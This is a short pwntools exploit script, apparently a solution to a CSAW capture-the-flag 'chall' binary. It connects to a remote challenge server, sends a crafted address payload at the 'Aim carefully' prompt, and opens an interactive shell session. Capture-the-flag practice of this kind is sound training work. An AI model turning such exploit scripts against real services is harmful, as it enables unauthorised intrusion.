#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall")

local = False 
if local:
    p = process("./chall")
    gdb.attach(p,'''b*0x00000000004007d0\nc''')
else:
    p = remote('intro.csaw.io', 31138)

elf = context.binary = ELF('./chall', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)


payload = b'400717'
sla(b'Aim carefully....', payload)

p.interactive()